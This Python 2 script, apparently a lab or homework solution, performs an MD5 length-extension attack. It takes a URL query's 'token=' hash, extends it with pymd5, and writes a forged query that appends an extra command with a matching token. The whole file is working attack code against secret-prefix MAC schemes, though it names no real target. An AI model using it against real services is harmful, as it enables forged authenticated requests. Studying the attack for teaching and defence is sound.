import sys
from pymd5 import md5, padding
from urllib import quote

query_file = sys.argv[1]
command3_file = sys.argv[2]
output_file = sys.argv[3]

# print query
# print command3
with open(query_file) as f:
    query = f.read().strip()
    f.close()

with open(command3_file) as f:
    command3 = f.read().strip()
    f.close()

def extract_hash(query):
    return query[6:38]


def length_extension_hash(query, suffix):
    inithash = extract_hash(query)
    h = md5(state=inithash.decode("hex"), count=512)
    h.update(suffix)
    return h.hexdigest()

def construct_query(query, newHash, suffix):
    # need to add a 8-character long password
    unpadded_size = 8 + len(query[39:])
    padding_str = padding(unpadded_size * 8)
    return 'token=' + newHash + '&' + query[39:] + quote(padding_str)  + suffix

# message : 12345678&user=admin&command1=ListFiles&command2=NoOp
# 52 bytes long

newhash = length_extension_hash(query, command3)
newquery = construct_query(query, newhash, command3)

with open(output_file, 'w') as f:
    f.write(newquery)
    f.close()

